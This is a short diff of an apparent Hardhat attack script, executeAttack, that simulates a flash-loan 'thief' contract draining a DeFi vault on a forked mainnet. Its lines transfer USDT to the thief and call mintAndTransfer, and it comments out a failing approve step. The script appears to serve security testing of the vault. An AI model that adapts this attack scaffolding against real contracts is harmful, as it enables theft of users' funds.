@@ -37,10 +37,9 @@ async function executeAttack(taskArguments, hre) {
   console.log("Transfered 100 USDT to flash thief's address");
 
 
-  console.log("BALANCE:", await usdt.connect(thiefSigner).balanceOf(flashThief.address))
-  await usdt.connect(thiefSigner).transfer(addresses.mainnet.Binance, usdtUnits("1"))
-  //await usdt.connect(thiefSigner).approve(vaultProxy.address, usdtUnits("100"))
-  console.log("Approved vault on behalf of thief contract");
+  // calling approve as thiefSigner fails with: ProviderError: unknown account [address_of_flashThief_contarct]
+  // await usdt.connect(thiefSigner).approve(vaultProxy.address, usdtUnits("100"))
+  // console.log("Approved vault on behalf of thief contract");
 
   await flashThief.connect(signers[4]).mintAndTransfer(
     addresses.mainnet.Binance,
